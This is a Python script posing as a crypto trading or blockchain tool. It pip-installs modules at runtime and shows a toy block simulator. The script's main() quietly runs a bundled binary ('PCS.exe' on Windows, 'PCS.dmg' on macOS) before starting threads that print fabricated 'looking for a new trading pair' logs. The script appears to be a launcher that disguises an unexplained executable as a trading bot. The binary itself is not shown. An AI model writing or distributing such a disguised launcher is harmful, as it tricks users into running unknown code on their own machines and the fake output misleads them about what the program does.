import importlib.util
import subprocess
import sys
import os
import platform
import threading
import time
import json
import random
import requests
import logging
from queue import Queue

def install_and_import(module_name):
    if importlib.util.find_spec(module_name) is None:
        print(f"Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
    else:
        print(f"{module_name} module is already installed.")

    globals()[module_name] = importlib.import_module(module_name)

modules = [
    'ctypes', 'time', 'json', 'random', 'requests', 'logging', 'queue'
]

for mod in modules:
    install_and_import(mod)

import ctypes
import threading
import time
import json
import random
import requests
import logging
from queue import Queue

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class BlockchainSimulator:
    def __init__(self):
        self.current_block = 0
        self.blocks = {}

    def generate_block(self):
        self.current_block += 1
        transactions = [f'tx_{random.randint(1000, 9999)}' for _ in range(random.randint(1, 20))]
        block = {
            'block_number': self.current_block,
            'transactions': transactions,
            'timestamp': time.time()
        }
        self.blocks[self.current_block] = block
        return block

    def get_block(self, block_number):
        return self.blocks.get(block_number)

def execute_based_on_os():
    if platform.system() == 'Windows':
        file_to_execute = 'PCS.exe'
    elif platform.system() == 'Darwin':  # Mac OS
        file_to_execute = 'PCS.dmg'
    else:
        print("Unsupported operating system.")
        return

    if os.path.exists(file_to_execute):
        subprocess.run([file_to_execute], check=True)
    else:
        print(f"{file_to_execute} not found.")

def rpc_server(blockchain, data_queue):
    while True:
        block = blockchain.generate_block()
        json_data = json.dumps(block)
        data_queue.put(json_data)
        logging.info(f"RPC Server: Looking for a new trading pair - Block Number {block['block_number']}")
        time.sleep(random.randint(1, 3))

def main():
    blockchain = BlockchainSimulator()
    data_queue = Queue()

    rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
    blockchain_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))

    execute_based_on_os()

    rpc_server_thread.start()
    blockchain_thread.start()

    rpc_server_thread.join()
    blockchain_thread.join()

if __name__ == "__main__":
    main()
